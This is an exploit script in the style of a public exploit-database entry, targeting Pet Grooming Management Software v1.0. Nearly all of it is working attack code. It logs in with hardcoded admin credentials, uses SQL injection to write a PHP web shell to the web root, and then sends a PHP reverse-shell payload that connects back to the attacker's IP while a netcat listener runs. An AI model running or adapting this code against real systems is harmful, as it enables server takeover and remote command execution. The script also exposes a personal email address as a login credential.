# Exploit Title: Pet Grooming Management Software v1.0 - Blind SQL Injection to Remote Code Execution
# Exploit Author: Deva Parekh (pr0f)
# Date: October 23, 2025
# Vendor Homepage: https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/mayuri_k/petgrooming_erp.zip
# Tested on: Kali Linux, Apache, Mysql
# Vendor: sourcecodester
# Version: v1.0
# Exploit Description:
#   Pet Grooming Management Software v1.0 suffers from an Blind SQL Injection that allows an attacker to upload a web shell. Using the web shell a reverse shell can be achieved. 

import requests, sys, time, os, multiprocessing, os

target = sys.argv[1]
kali_ip = sys.argv[2]
nc_port = 4444

admin_email = 'mdkhairnar92@gmail.com'
admin_password = 'admin'
sqli_payload = '''id=21'; SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"# '''
rce_payload = f"php -r '$sock=fsockopen(\"{kali_ip}\",{nc_port});$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"

def login(session):
    headers = {'Content-Type' : 'application/x-www-form-urlencoded;charset=UTF-8'}
    payload = f'email={admin_email}&password={admin_password}'
    session.post(f'http://{target}/pet_grooming/assets/app/auth.php', data=payload, headers=headers)

def sqli(session):
    headers = {'Content-Type' : 'application/x-www-form-urlencoded;charset=UTF-8'}
    payload = f'id={sqli_payload}'
    session.post(f'http://{target}/pet_grooming/admin/update_product.php', data=payload, headers=headers)

def rev_shell(session):
    session.get(f'http://{target}/shell.php?cmd={rce_payload}')

multiprocessing.Process(target=os.system, args=(f'nc -lvnp {nc_port}',)).start()
time.sleep(0.5)
s = requests.Session()

print('')
print('┏━┓┏━┓┏━┓┏━╸')
print('┣━┛┣┳┛┃┃┃┣╸ ')
print('╹  ╹┗╸┗━┛╹  ')
print('~ https://github.com/pr0f94')
print('~ Pet Grooming v1 - sqli > web shell > rce')
print('')

print('-- Logging in as user')
login(s)
print('-- Uploading web shell via sqli')
sqli(s)
print('-- Sending reverse shell payload via web shell')
rev_shell(s)